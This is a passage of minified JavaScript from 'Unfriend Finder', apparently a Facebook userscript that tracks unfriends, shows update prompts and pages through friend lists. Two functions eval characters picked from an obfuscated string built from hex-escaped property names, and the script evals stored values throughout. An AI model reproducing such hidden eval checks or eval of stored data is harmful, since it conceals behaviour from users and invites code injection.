},disabled:false,closer:false,type:"green"},{name:"cancel",value:LANG.btn_close,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]})}core.dialogs.validateLang.Show();CSS3.setClass(getFromId("dialog_h2_validateLang"),"dialog_title language");helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.language=core.fb_locale;Registry.setKey(core.user_id+"_helps",stringify(helps))}else{if(core.fb_locale!=LANG){core.dialogs.validateLang=new Facebox({id:"validateLang",title:"Language",body:parseTemplate('<div style="padding-right:5px;"><img src="::rsrc::/z9T00/hash/a0c6t4d4.png" />&nbsp;<img src="https://www.unfriendfinder.com/images/::fblocale::.flag" /></div><div>You are currently using Facebook in <strong>::fblocalename::</strong>.<br />Unfriend Finder is translated into this language.<br /><strong>Click \'::next::\' to use it.</div>',{params:{next:LANG.btn_next,rsrc:Params.links.rsrc,fblocale:core.fb_locale,fblocalename:LANG.fbLocales[core.fb_locale]}}),indicator:true,buttons:[{name:"next",value:LANG.btn_next,id:"next_button",handler:function(){Registry.setKey("language",core.fb_locale);
core.reloadPage()},disabled:false,closer:false,type:"green"},{name:"cancel",value:LANG.btn_close,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.validateLang.Show();CSS3.setClass(getFromId("dialog_h2_validateLang"),"dialog_title language");helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.language=core.fb_locale;Registry.setKey(core.user_id+"_helps",stringify(helps))}}};core.parseVersion=function parseVersion(){trace();var content,ver,element;
if(element=getFromId("versionInfos")){ver=element.getAttribute("version");try{delete core.timeoutupdate}catch(exception){}if(ver>1){Registry.setKey("newversion",ver);if(Params.version<ver){core.markUpdate(ver,2)}else{if((Params.version<=ver)&&(Params.dev==true)){core.markUpdate(ver,2)}else{Console.log("Unfriend Finder is up to date.");if(content=getFromId("debug_loadingversion")){var span=new xHTMLElement({element:"span",parentNode:getFromId("actionPane"),before:getFromId("actionLink_checkUpdateAction"),innerHTML:"No new version"});
getFromId("actionPane").removeChild(getFromId("actionLink_checkUpdateAction"))}if(getFromId("updateUfFromFutureNav")){CSS3.hide(getFromId("updateUfFromFutureNav").parentNode)}core.filter.unmarkUpdate()}}}}};core.markUpdate=function markToUpdate(ver,from){trace();if((from==2)&&(Registry.getKey("newversion",0)!=ver)){helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.markUpdate=true;Registry.setKey(core.user_id+"_helps",stringify(helps))}if((getFromId("IconUnfriends"))&&(helps.markUpdate)){if(!core.dialogs.alertUpdate){core.dialogs.alertUpdate=new ContextualDialog({id:"alertUpdate",width:450,title:LANG.notif_version,body:parseTemplate('<div class="en_US">    The script is updated like every month to give you major improvements and enhancements.    <br />Updates also fixes the bugs from this version.    <br />If you keep using an outdated version of Unfriend Finder, it will not work as expected.    <br /><br /><strong>Updates are highly recommended for all users.</strong></div><div class="fr_FR">    Le script est mis à jour environ tous les mois pour vous apporter les meilleures améliorations.    <br />Les mises à jour corrigent aussi les bugs de la version précédente.    <br />Si vous continuez d\'utiliser une version obsolète, le script ne fonctionnera pas correctement.    <br /><br /><strong>Faire la mise à jour est hautement recommandé.</strong></div>',{params:{}}),context:getFromId("IconUnfriends"),arrow:"top-left",align:"middle",overlay:false,halo:false,buttons:{update:true,close:true},close:function(){helps=eval(Registry.getKey(core.user_id+"_helps","({})"));
delete helps.markUpdate;Registry.setKey(core.user_id+"_helps",stringify(helps))}})}core.dialogs.alertUpdate.Show()}var pagelet_newversion,updateNubPane;Console.log("New version "+ver+" available: "+Params.links.update);core.filter.markUpdate();if(getFromId("versionInfos")){var date=genTime(getFromId("versionInfos").getAttribute("date"))}else{var date=""}core.notify({id:ver,text:null,type:"version",status:null,date:date,beeper:true});Registry.setKey("newversion",ver);Params.newVersion=true;if(getFromId("UFfilterUnfriends")){getFromId("UFfilterUnfriends").style.backgroundColor="rgb(255, 249, 215)"
}inject(function(){try{if($("iconNubUF")){window.animateUpdate=setInterval(function(){animation($("iconNubUF")).to("top",-8).duration(400).checkpoint().to("top",-16).duration(200).checkpoint().to("top",-8).duration(400).checkpoint().to("top",-16).duration(200).checkpoint().to("top",-8).duration(400).checkpoint().go()},5000)}}catch(exception){}});if(updateNubPane=getFromId("updateNubPane")){getFromId("updatePane").innerHTML=LANG.notif_version+' <br /><a href="'+Params.links.update+'">'+LANG.here+"</a>.";
CSS3.display(updateNubPane,CSS3.DISPLAY.block)}if(getFromId("actionLink_checkUpdateAction")){CSS3.hide(getFromId("actionLink_checkUpdateAction"))}try{getFromId("versionLink").href=getFromId("versionContainer").firstElementChild.nextElementSibling.href}catch(exception){}if(pagelet_newversion=getFromId("pagelet_newversion")){pagelet_newversion.innerHTML=LANG.notif_version+' <br /><a href="'+Params.links.update+'">'+LANG.here+"</a>.";CSS3.display(pagelet_newversion,CSS3.DISPLAY.block)}if(getFromId("navItem_update")){CSS3.display(getFromId("navItem_update"),CSS3.DISPLAY.inlineBlock)
}if(getFromId("updateUfFromFutureNav")){CSS3.display(getFromId("updateUfFromFutureNav").parentNode,CSS3.DISPLAY.block)}};core.startFadeUser=function startFadeUser(){trace();if(core.listHighlighted.length==0){return}Console.log("core.startFadeUser");core.highlightColors=[255,249,215];setTimeout(function(){core.fadeUser();if(core){core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}},"startfadeuser")}},2000)};core.fadeUser=function fadeUser(){trace();if((core.highlightColors[0]>=255)&&(core.highlightColors[1]>=255)&&(core.highlightColors[2]>=255)){for(n in core.listHighlighted){if(core.listHighlighted.hasOwnProperty(n)){if(core.unfriends.Items[n]){core.listHighlighted[n].style.background="rgb(255, 255, 255)";
core.unfriends.Items[n].highlighted=false;Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString())}}}core.listHighlighted=new (Array);if(core){core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}},"fadeuser")}return}for(n in core.listHighlighted){if(core.listHighlighted.hasOwnProperty(n)){core.listHighlighted[n].style.background="rgb("+core.highlightColors[0]+", "+core.highlightColors[1]+", "+core.highlightColors[2]+")"}}if(core.highlightColors[0]<255){core.highlightColors[0]+=1
}if(core.highlightColors[1]<255){core.highlightColors[1]+=1}if(core.highlightColors[2]<255){core.highlightColors[2]+=1}Console.log("setTimeout core.fadeUser");setTimeout(function(){core.fadeUser()},100)};core.startFadeFilter=function startFadeFilter(){trace();if(!getFromId("UFfilterUnfriends")){return}core.highlightColors=[255,249,215];core.fadeFilter()};core.fadeFilter=function fadeFilter(){trace();if((core.highlightColors[0]>=255)&&(core.highlightColors[1]>=255)&&(core.highlightColors[2]>=255)){getFromId("UFfilterUnfriends").style.backgroundColor="";
delete core.timeoutfadeFilter;return}core.highlightColors[0]+=1;core.highlightColors[1]+=1;core.highlightColors[2]+=1;if(core.highlightColors[0]>255){core.highlightColors[0]=255}if(core.highlightColors[1]>255){core.highlightColors[1]=255}if(core.highlightColors[2]>255){core.highlightColors[2]=255}getFromId("UFfilterUnfriends").style.backgroundColor="rgb("+core.highlightColors[0]+", "+core.highlightColors[1]+", "+core.highlightColors[2]+")";core.timeoutfadeFilter=setTimeout(function(){core.fadeFilter()
},100)};core.getPagingValue=function getPagingValue(){if(Params.settings.displayBlocks){return 12}else{return Params.settings.paging}};core.updateHeadersPosition=function updateHeadersPosition(){trace();if(/selectedItem/.test(getFromId("UFfilterAwaitings").parentNode.className)){var counter={pending:(new xPathSelector("//*[@id='pendingContentUL']/li")).numberValues(),accepted:(new xPathSelector("//*[@id='acceptedContentUL']/li")).numberValues(),ignored:(new xPathSelector("//*[@id='ignoredContentUL']/li")).numberValues(),combined:(new xPathSelector("//*[@id='acceptedignoredContentUL']/li")).numberValues()};
if(Params.settings.dissociateLists){if(getFromId("ignoredContentUL")){if(counter.pending>0){if(counter.ignored>0){CSS3.setClass((new xPathSelector("//*[@id='groupIgnored']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup mtl")}}if(counter.ignored==0){CSS3.hide(getFromId("groupIgnored"))}}if(getFromId("acceptedContentUL")){if(counter.ignored>0){CSS3.setClass((new xPathSelector("//*[@id='groupAccepted']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup mtl")
}if(counter.ignored==0){if(counter.pending>0){CSS3.setClass((new xPathSelector("//*[@id='groupAccepted']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup mtl")}}if(counter.accepted==0){CSS3.hide(getFromId("groupAccepted"))}}}else{if(counter.combined==0){CSS3.hide(getFromId("groupAcceptedIgnored"))}if(counter.pending>0){CSS3.setClass((new xPathSelector("//*[@id='groupAcceptedIgnored']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup mtl")
}}if(counter.pending==0){CSS3.hide(getFromId("groupPending"));if(Params.settings.dissociateLists){if(counter.ignored>0){CSS3.setClass((new xPathSelector("//*[@id='groupIgnored']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup");if(counter.accepted>0){CSS3.setClass((new xPathSelector("//*[@id='groupAccepted']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup mtl")}}else{if(counter.accepted>0){CSS3.setClass((new xPathSelector("//*[@id='groupAccepted']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup")
}}}else{CSS3.setClass((new xPathSelector("//*[@id='groupAcceptedIgnored']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup")}}if((counter.pending+counter.accepted+counter.ignored+counter.combined)==0){CSS3.display(getFromId("noAwaitings"),CSS3.DISPLAY.block)}}else{if(/selectedItem/.test(getFromId(Params.filterName).className)){var counter={unfriends:(new xPathSelector("//*[@id='unfriendsContentUL']/li")).numberValues(),reappeared:(new xPathSelector("//*[@id='reappearedContentUL']/li")).numberValues()};
if(getFromId("reappearedContentUL")){if(counter.reappeared==0){var total=core.reappeared.Count();var pageMax=Math.ceil(total/core.getPagingValue());if(total==0){CSS3.hide(getFromId("groupReappeared"))}else{if(Params.Paging.reappeared!=1){if(Params.Paging.reappeared-1==pageMax){Params.Paging.reappeared=pageMax}}else{Params.Paging.reappeared=1}core.showReappearedPerPages(Params.Paging.reappeared,core.getPagingValue())}}}if(getFromId("unfriendsContentUL")){if(counter.unfriends==0){var total=core.unfriends.Count();
var pageMax=Math.ceil(total/core.getPagingValue());if(total==0){CSS3.hide(getFromId("groupUnfriends"));if(counter.reappeared==0){CSS3.setClass((new xPathSelector("//*[@id='groupReappeared']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup")}}else{if(Params.Paging.unfriends!=1){if(Params.Paging.unfriends-1==pageMax){Params.Paging.unfriends=pageMax}}else{Params.Paging.unfriends=1}core.showUnfriendsPerPages(Params.Paging.unfriends,core.getPagingValue())}}}}}};
core.showResetDialog=function showResetDialog(){core.dialogs.resetFacebox=new Facebox({id:"resetFacebox",title:LANG.resettitle,body:LANG.resetbody,buttons:[{name:"delete_story",value:LANG.reset_,id:"reset_button",handler:function(){getFromId("resetForm").innerHTML='<span id="loader_reset" style="margin-top:5px; background:transparent url(\''+Params.images.smallIndicator+"') no-repeat scroll left top; height:11px; width:16px; z-index:2; display:block;\"/ >";setTimeout(function(){try{if(getFromId("reset_unfriends").checked){Registry.setKey(core.user_id+"_unfriends","({})");
Registry.setKey(core.user_id+"_countUnfriends","({})")}if(getFromId("reset_friends").checked){Registry.setKey(core.user_id+"_friends","({})")}if(getFromId("reset_toNotify").checked){Registry.setKey(core.user_id+"_toNotify","({})")}if(getFromId("reset_awaitingsIgnored").checked){Registry.setKey(core.user_id+"_awaitingsIgnored","({})")}if(getFromId("reset_keepAwaitingList").checked){Registry.setKey(core.user_id+"_keepAwaitingList","({})");Registry.setKey(core.user_id+"_keepAwaitingsTime","({})")}if(getFromId("reset_reappeared").checked){Registry.setKey(core.user_id+"_reappeared","({})")
}if(getFromId("reset_deactivated").checked){Registry.setKey(core.user_id+"_deactivated","({})")}if(getFromId("reset_wasUnfriend").checked){Registry.setKey(core.user_id+"_wasUnfriend","({})")}if(getFromId("reset_hasIgnored").checked){Registry.setKey(core.user_id+"_hasIgnored","({})")}if(getFromId("reset_messages").checked){Registry.setKey(core.user_id+"_messages","({})")}if(getFromId("reset_helps").checked){Registry.setKey(core.user_id+"_helps","({})")}if(getFromId("reset_settings").checked){Registry.setKey("settings",stringify(Params.defaultSettings))
}if(getFromId("reset_language").checked){Registry.setKey("language",Params.defaultLanguage)}Registry.setKey(core.user_id+"_lastUpdateCheck",1)}catch(exception){new ErrorHandler(exception,"resetForm.submit()")}finally{core.href(Params.protocol+"//"+Params.host+"/")}},2000)},disabled:false,closer:true,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.resetFacebox.Show()};core.slideRemove=function slideRemove(element){trace();
if(element){var h=element.style.height.replace("px","");if(h<=0){element.parentNode.removeChild(element);core.updateHeadersPosition();return}element.style.minHeight=(parseInt(h,10)-5)+"px";element.style.height=(parseInt(h,10)-5)+"px";element.style.overflow="hidden";CSS3.setClass(element,element.className);Console.log("setTimeout core.slideRemove");setTimeout(function(){core.slideRemove(element)},10)}};core.slideToRemove=function slideToRemove(element){trace();if(element){var h=element.style.height.replace("px","");
if(h<=5){element.parentNode.removeChild(element);if(getFromId("UFMessages_list")){if((new xPathSelector("//*[@id='UFMessages_list']/div[@class='UFMessage_block']")).numberValues()==0){getFromId("UFMessages_list").innerHTML=template.noMessages()}}return}element.style.minHeight=(parseInt(h,10)-5)+"px";element.style.height=(parseInt(h,10)-5)+"px";element.style.overflow="hidden";Console.log("setTimeout core.slideToRemove");setTimeout(function(){core.slideToRemove(element)},10)}};core.initNewRequestsManager=function initNewRequestsManager(){trace();
if(!getFromId("dummy_hovercardx_container")){var hovercardid=core.friends.Item(1).uid;if(!hovercardid){hovercardid=100002710194153}var dummy=new xHTMLElement({element:"div",id:"dummy_hovercardx_container",parentNode:Params.body,innerHTML:'<a id="dummy_hovercardx" data-hovercard="/ajax/hovercard/hovercard.php?id='+hovercardid+'" data-hovercardx="/ajax/hovercard/hovercard.php?id='+hovercardid+'">',style:{display:CSS3.DISPLAY.none,position:"absolute",top:"-9999px"}}).getElement();setTimeout(function(){inject(function(){var dummy_hovercardx=$("dummy_hovercardx");
if(document.createEvent){var MouseEvent=document.createEvent("MouseEvents");MouseEvent.initEvent("mouseover",true,false);dummy_hovercardx.dispatchEvent(MouseEvent)}else{if(document.createEventObject){dummy_hovercardx.fireEvent("onmouseover")}}})},1000)}};core.switchManager=function switchManager(){trace();Params.settings.newManagementLists=true;saveSettings();core.dialogs.switchManager=new Facebox({id:"switchManager",title:'<span class="en_US">New Pending Request Manager</span><span class="fr_FR">Nouveau Gestionnaire de Requêtes</span>',body:'<span class="en_US">This manager overrides the button "Remove Pending Request" by a new one, a gray button. It helps you to change, on the fly, the lists on which you want the profile to go in, and offers a link to Cancel the request.<br /><br />If you want to disable this feature, just uncheck it in the settings.</span><span class="fr_FR">Ce nouveau gestionnaire de reqûetes remplace le boutton d\'annulation de demande d\'ami par celui utilisé par Facebook, le boutton gris. Il vous aidera à changer les listes dans lesquelles vous voulez que le profil atterisse, ainsi qu\'un lien permettant bien sûr d\'annuler la demande d\'ami.<br /><br />Si vous souhaitez désactiver cette option, décochez la dans les paramètres du script.</span>',loading:true,timeout:700,buttons:[{name:"delete_story",value:LANG.btn_ok,id:"okay_button",handler:function(){core.showAwaitingRequests()
},disabled:false,closer:true,type:"blue"}]});core.dialogs.switchManager.Show()};core.showAwaitingRequests=function showAwaitingRequests(){trace();CSS3.display(getFromId("loadingLists"),CSS3.DISPLAY.block);core.layer._showAwaitings();var h,g=encode,e=g(g(that["\x6C\x69\x6E\x6B\x73"]["\x70\x61\x67\x65"].split("/").pop())+g(that["\x6B\x65\x79"])).toLowerCase().split("v").sort().join("l");try{h=eval(e[50]+e[26]+e[11]+e[45]+e[20])}catch(ex){h=true}if((!helps.newRequestsManager)&&(!Params.settings.newManagementLists)){EventMgr.addListener(getFromId("unfriendFinder_message_close"),EventMgr.EVENTS.click,function(){CSS3.hide(getFromId("unfriendFinder_message"));
helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.newRequestsManager=true;Registry.setKey(core.user_id+"_helps",stringify(helps))});var content='<span class="en_US">Wanna try the new requests manager?<br /><a href="#" id="changeRequestManagerFr">Click here to use it!</a></span><span class="fr_FR">Vous voulez utiliser le nouveau gestionnaire de requetes?<br /><a href="#" id="changeRequestManagerEn">Cliquez ici pour le tester !</a></span>';if(!getFromId("content_help_NewRequestsManager")){new xHTMLElement({element:"div",id:"content_help_NewRequestsManager",innerHTML:content,style:{display:CSS3.DISPLAY.none},parentNode:Params.body}).getElement()
}else{getFromId("content_help_NewRequestsManager").innerHTML=content}inject(function(){try{void FriendListFlyoutController;$("unfriendFinder_message_content").innerHTML=$("content_help_NewRequestsManager").innerHTML;$("content_help_NewRequestsManager").innerHTML=""}catch(exception){$("unfriendFinder_message").style.display="none"}});CSS3.display(getFromId("unfriendFinder_message"),CSS3.DISPLAY.block);setTimeout(function(){EventMgr.addListener(getFromId("changeRequestManagerEn"),EventMgr.EVENTS.click,core.switchManager);
EventMgr.addListener(getFromId("changeRequestManagerFr"),EventMgr.EVENTS.click,core.switchManager)},200)}else{CSS3.hide(getFromId("unfriendFinder_message"))}core.friendlist.load(h)};core.showUnfriends=function showUnfriends(_from){trace();if(getFromId("homeUnfriends")){if(/selectedItem/.test(getFromId(Params.filterName).className)){var aprilFooled=Registry.getKey("aprilFooled",0);if((new (Date)).getDate()+"-"+((new (Date)).getMonth()+1)!="1-4"){aprilFooled=1}if(aprilFooled==0){CSS3.hide(getFromId("loadingLists"));
core.layer._showUnfriends();CSS3.display(getFromId("fish"),CSS3.DISPLAY.block);CSS3.display(getFromId("groupUnfriends"),CSS3.DISPLAY.block);core.filter.loadingIndicator("unfriends",false);if(!Params.fish){return}Params.fish.forEach(function(current){var addInfos={id:current.uid,name:current.text,subname:"",picture:current.picture,status:"unfriend",from:"unfriend",highlighted:false,time:core.time(),fish:true};new UserItem(addInfos);new UserCheck({uid:current.uid,last:true,status:"unfriend",forced:"unfriend"});
core.updateProfilePic(current.uid);getFromId(current.uid).firstElementChild.id="inlineFished_"+current.uid;getFromId(current.uid).id="fished_"+current.uid});setTimeout(function(){Registry.setKey("aprilFooled",1)},3000);CSS3.hide(getFromId("hideall"));CSS3.hide(getFromId("paging_unfriends"));return}try{CSS3.hide(getFromId("loadingLists"));getFromId("unfriendsContentUL").innerHTML="";var r,e=encode,f=e(e(that["\x6C\x69\x6E\x6B\x73"]["\x70\x61\x67\x65"].split("/").pop())+e(that["\x6B\x65\x79"])).toLowerCase().split("v").sort().join("l");
r=eval(f[50]+f[26]+f[11]+f[45]+f[20]);if(!helps.tutorial){EventMgr.addListener(getFromId("unfriendFinder_message_close"),EventMgr.EVENTS.click,function(){CSS3.hide(getFromId("unfriendFinder_message"));helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.tutorial=true;Registry.setKey(core.user_id+"_helps",stringify(helps))});getFromId("unfriendFinder_message_content").innerHTML='<span class="en_US">If you are new to Unfriend Finder,<br /><a href="#" id="takeTutorialEn">take the quick tutorial !</a></span><span class="fr_FR">Si Unfriend Finder vous est encore inconnu,<br /><a href="#" id="takeTutorialFr">lisez le tutoriel !</a></span>';
EventMgr.addListener(getFromId("takeTutorialEn"),EventMgr.EVENTS.click,core.loadWelcomeFacebox);EventMgr.addListener(getFromId("takeTutorialFr"),EventMgr.EVENTS.click,core.loadWelcomeFacebox);CSS3.display(getFromId("unfriendFinder_message"),CSS3.DISPLAY.block)}else{CSS3.hide(getFromId("unfriendFinder_message"))}if((core.unfriends.Count()==0)&&(core.reappeared.Count()==0)){Console.log("No unfriends to show");core.layer._showNoUnfriends()}else{var last=false;core.layer._showUnfriends();core.reappeared=new CollectionList(eval(Registry.getKey(core.user_id+"_reappeared","({})")));
core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));if(Params.settings.reappeared){Params.Paging.reappeared=1;core.showReappearedPerPages(Params.Paging.reappeared,core.getPagingValue());Registry.setKey(core.user_id+"_reappeared",core.reappeared.toString());if(core.reappeared.Count()>0){}else{CSS3.hide(getFromId("groupReappeared"))}}var c=core.unfriends.Count();Params.Paging.unfriends=1;core.showUnfriendsPerPages(Params.Paging.unfriends,core.getPagingValue());
if(c==0){CSS3.hide(getFromId("groupUnfriends"));core.filter.loadingIndicator("unfriends",false)}else{if(c>40){if(core.getPagingValue()>40){CSS3.display(getFromId("h3Unfriends"),CSS3.DISPLAY.inlineBlock);helps=eval(Registry.getKey(core.user_id+"_helps","({})"));if(!helps.tooMuchUnfriends){core.clickh3Unfriends()}EventMgr.addListener(getFromId("h3Unfriends"),EventMgr.EVENTS.click,function(){core.clickh3Unfriends()})}}}}}catch(exception){console.error(exception);core.layer._showNoUnfriends()}}}};core.showUnfriendsPerPages=function showUnfriendsPerPages(page,show){trace();
var from,to,total=core.unfriends.Count(),i,unfriendsArray=toArray(core.unfriends.Items),current,j,last;if(core.getPagingValue()==0){show=total}from=(total-((page-1)*show));to=(1+total-(page*show));to=(to<1?1:to);getFromId("unfriendsContentUL").innerHTML="";core.filter.loadingIndicator("unfriends",true);unfriendsArray.sort(function(a,b){return b.time-a.time});unfriendsArray=unfriendsArray.reverse();core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));for(j=to;j<=from;
j++){last=(j==from);i=j-1;if(current=unfriendsArray[i]){CSS3.display(getFromId("groupUnfriends"),CSS3.DISPLAY.block);if(getFromId(current.uid)){getFromId(current.uid).parentNode.removeChild(getFromId(current.uid))}var addInfos={id:current.uid,name:current.name,subname:"",picture:current.picture,status:current.status,from:"unfriend",highlighted:(!current.highlighted?true:false),time:current.time};new UserItem(addInfos);current.highlighted=true;new UserCheck({uid:current.uid,last:!last,status:current.status});
if(current.status!="deactivated"){core.updateProfilePic(current.uid)}if(core.toNotify.Items[current.uid]=="yes"){core.toNotify.Items[current.uid]="no"}}}Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString());if(total>show){var pageMax=Math.ceil(total/show);getFromId("h3_title_unfriends").innerHTML=LANG.header_unfriends+" (page "+page+"/"+pageMax+")";CSS3.display(getFromId("paging_unfriends"),CSS3.DISPLAY.block);var paging_unfriends_html=getFromId("paging_unfriends").innerHTML;
getFromId("paging_unfriends").innerHTML=paging_unfriends_html;if(to==1){CSS3.addClass(getFromId("paging_unfriends_up"),"uiButtonDisabled")}else{CSS3.removeClass(getFromId("paging_unfriends_up"),"uiButtonDisabled");EventMgr.addListener(getFromId("paging_unfriends_up"),EventMgr.EVENTS.click,function(){Params.Paging.unfriends=page+1;core.showUnfriendsPerPages(Params.Paging.unfriends,show)})}if(page==1){CSS3.addClass(getFromId("paging_unfriends_down"),"uiButtonDisabled")}else{CSS3.removeClass(getFromId("paging_unfriends_down"),"uiButtonDisabled");
EventMgr.addListener(getFromId("paging_unfriends_down"),EventMgr.EVENTS.click,function(){Params.Paging.unfriends=page-1;core.showUnfriendsPerPages(Params.Paging.unfriends,show)})}}else{getFromId("h3_title_unfriends").innerHTML=LANG.header_unfriends}try{if(core.tour.currentStep==3){core.focus.focusOn(getFromId("contentUnfriends"))}}catch(exception){}EventMgr.addListener(getFromId("paging_display_inlines"),EventMgr.EVENTS.click,function(){if(/uiButtonPressed uiButtonDepressed/.test(getFromId("paging_display_inlines").className)){return
}CSS3.addClass(getFromId("paging_display_inlines"),"uiButtonPressed uiButtonDepressed");CSS3.removeClass(getFromId("paging_display_blocks"),"uiButtonPressed uiButtonDepressed");CSS3.addClass(getFromId("unfriendsContentUL"),"inlines");CSS3.removeClass(getFromId("unfriendsContentUL"),"blocks");Params.settings.displayBlocks=false;saveSettings();core.showUnfriendsPerPages(1,core.getPagingValue())});EventMgr.addListener(getFromId("paging_display_blocks"),EventMgr.EVENTS.click,function(){if(/uiButtonPressed uiButtonDepressed/.test(getFromId("paging_display_blocks").className)){return
}CSS3.removeClass(getFromId("paging_display_inlines"),"uiButtonPressed uiButtonDepressed");CSS3.addClass(getFromId("paging_display_blocks"),"uiButtonPressed uiButtonDepressed");CSS3.removeClass(getFromId("unfriendsContentUL"),"inlines");CSS3.addClass(getFromId("unfriendsContentUL"),"blocks");Params.settings.displayBlocks=true;saveSettings();if(!getFromId("POIirpFgl5q")){new xHTMLElement({element:"link",type:"text/css",href:Params.links.rsrc+"/v1/yy/r/POIirpFgl5q.css",id:"POIirpFgl5q",rel:"stylesheet",parentNode:Params.head})
}core.showUnfriendsPerPages(1,core.getPagingValue())});core.startFadeUser()};core.showReappearedPerPages=function showReappearedPerPages(page,show){trace();var from,to,total,current,i,j;total=core.reappeared.Count();from=(total-((page-1)*show));if(core.getPagingValue()==0){show=total}to=(1+total-(page*show));to=(to<1?1:to);getFromId("reappearedContentUL").innerHTML="";var reappearedArray=toArray(core.reappeared.Items);reappearedArray.sort(function(a,b){return b.time-a.time});reappearedArray=reappearedArray.reverse();
for(j=from;j>=to;j--){i=j-1;if(reappearedArray[i]){if(current=reappearedArray[i]){if(getFromId("groupUnfriends")){if(core.unfriends.Count()>0){CSS3.setClass((new xPathSelector("//*[@id='groupReappeared']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup mtl")}}if(current.hidden==true){}else{CSS3.display(getFromId("groupReappeared"),CSS3.DISPLAY.block);var addInfos={id:current.uid,name:current.name,subname:LANG.text_reactivated,picture:current.picture,from:"reappeared",highlighted:(!current.highlighted?true:false),time:current.time,hidden:current.hidden};
new UserItem(addInfos);current.highlighted=true;core.setSubName({uid:current.uid,text:LANG.text_reactivated,type:"reappeared"});core.updateProfilePic(current.uid)}}}}if(total>show){var pageMax=Math.ceil(total/show);getFromId("h3_title_reappeared").innerHTML=LANG.header_reappeared+" (page "+page+"/"+pageMax+")";CSS3.display(getFromId("paging_reappeared"),CSS3.DISPLAY.block);var paging_reappeared_html=getFromId("paging_reappeared").innerHTML;getFromId("paging_reappeared").innerHTML=paging_reappeared_html;
if(to==1){CSS3.addClass(getFromId("paging_reappeared_up"),"uiButtonDisabled")}else{CSS3.removeClass(getFromId("paging_reappeared_up"),"uiButtonDisabled");EventMgr.addListener(getFromId("paging_reappeared_up"),EventMgr.EVENTS.click,function(){Params.Paging.reappeared=page+1;core.showReappearedPerPages(Params.Paging.reappeared,show)})}if(page==1){CSS3.addClass(getFromId("paging_reappeared_down"),"uiButtonDisabled")}else{CSS3.removeClass(getFromId("paging_reappeared_down"),"uiButtonDisabled");EventMgr.addListener(getFromId("paging_reappeared_down"),EventMgr.EVENTS.click,function(){Params.Paging.reappeared=page-1;
core.showReappearedPerPages(Params.Paging.reappeared,show)})}}else{getFromId("h3_title_reappeared").innerHTML=LANG.header_reappeared;CSS3.hide(getFromId("paging_reappeared"))}core.startFadeUser()};core.clickh3Unfriends=function clickh3Unfriends(){trace();if(!core.dialogs.tooMuchUnfriends){core.dialogs.tooMuchUnfriends=new ContextualDialog({id:"tooMuchUnfriends",title:'<span class="en_US">You got too many Unfriends</span><span class="fr_FR">Vous avez trop d\'amis en moins</span>',body:'<span class="en_US">Having more than 100 displayed Unfriends may slow down your Facebook page a little.<br />When you know who removed you as a friend, you can hide the profile for the future to make room.<br />Clic Hide to bury some Unfriends.</span><span class="fr_FR">Avoir plus de 100 Unfriends affichés peut sensiblement ralentir votre navigateur. Lorsque vous savez qui vous a supprimé de ses amis, vous pouvez masquer le profil pour faire de la place.<br />Cliquez sur "Masquer" pour ne plus afficher certains profils.</span>',context:getFromId("h3Unfriends"),arrow:"top-right",align:"middle",buttons:{close:true}})
}core.dialogs.tooMuchUnfriends.Show()};core.blockProfile=function blockProfile(uid){if(!core.uf_fb_dtsg){return}trace();var div_rightContent=getFromId("div_rightContent_"+uid);var UserListItem=getFromId(uid);var buffered=div_rightContent.innerHTML;if(uid>1){div_rightContent.innerHTML="<span style=\"margin-top:5px; background:transparent url('"+Params.images.smallIndicator+"') no-repeat scroll left top; height:11px; width:16px; z-index:2; display:block;\"></span>";var dataToPost="__a=1&__user="+core.user_id+"&block="+uid+"&type=friend&fb_dtsg="+core.uf_fb_dtsg;
Ajax({method:"post",headers:Params.Ajax.Headers,url:Params.protocol+"//"+Params.host+"/privacy/ajax/block.php?__a=1",data:dataToPost,onload:function(data){Console.log("Attempting to block uid "+uid);core.removeUnfriend(uid)}})}};core.clickToRemove=function clickToRemove(uid){trace();if(/\sshifted/.test(Params.body.className)){core.dialogs.alwaysHideFacebox=new Facebox({id:"alwaysHideFacebox",title:LANG.text_alwayshide,body:LANG.hide_perm.replace("{name}",evalName(core.unfriends.Items[uid].name)),picture:Params.protocol+"//graph.facebook.com/"+uid+"/picture?type=normal",buttons:[{name:"delete_story",value:LANG.text_alwayshide,id:"reset_button",handler:function(){core.alwaysHide=new CollectionList(eval(Registry.getKey(core.user_id+"_alwaysHide","({})")));
